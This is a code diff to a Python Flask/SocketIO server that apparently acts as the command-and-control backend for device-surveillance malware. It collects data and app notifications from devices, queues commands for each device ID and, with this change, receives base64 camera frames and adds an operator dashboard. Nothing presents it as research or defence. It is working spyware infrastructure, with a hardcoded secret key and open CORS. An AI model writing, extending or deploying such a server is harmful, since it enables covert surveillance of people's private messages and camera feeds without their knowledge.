@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, render_template
 from flask_socketio import SocketIO, emit
 from datetime import datetime
 import json
@@ -8,7 +8,7 @@ import uuid
 import os
 from threading import Lock
 
-app = Flask(__name__)
+app = Flask(__name__, template_folder='templates')
 app.config['SECRET_KEY'] = 'secret!'
 socketio = SocketIO(app, cors_allowed_origins="*")
 db_lock = Lock()
@@ -39,6 +39,10 @@ init_db()
 pending_commands = {}
 connected_ws = {}
 
+@app.route('/')
+def index():
+    return render_template('dashboard.html')
+
 @app.route('/api/collect', methods=['POST'])
 def collect():
     data = request.json
@@ -64,8 +68,7 @@ def notification():
         conn.commit()
         conn.close()
     print(f"[!] Notification from {data.get('package')}")
-    # Broadcast via WebSocket
-    socketio.emit('notification', data, room=data.get('device_id'))
+    socketio.emit('notification', data)
     return jsonify({"status": "ok"})
 
 @app.route('/api/command/<device_id>', methods=['GET'])
@@ -145,10 +148,13 @@ def handle_disconnect():
             del connected_ws[device_id]
             break
 
-@socketio.on('log')
-def handle_log(data):
-    # Broadcast log to all admins (or store)
-    print(f"[WS LOG] {data}")
+@socketio.on('stream')
+def handle_stream(data):
+    # data is base64 encoded JPEG frame from camera
+    # Broadcast to all admins or just store; here we simply log
+    print("Received camera frame (length: {})".format(len(data) if data else 0))
+    # optionally re-emit to a different room
+    # emit('camera_frame', data, broadcast=True)
 
 if __name__ == '__main__':
     socketio.run(app, host='0.0.0.0', port=5000, debug=False)
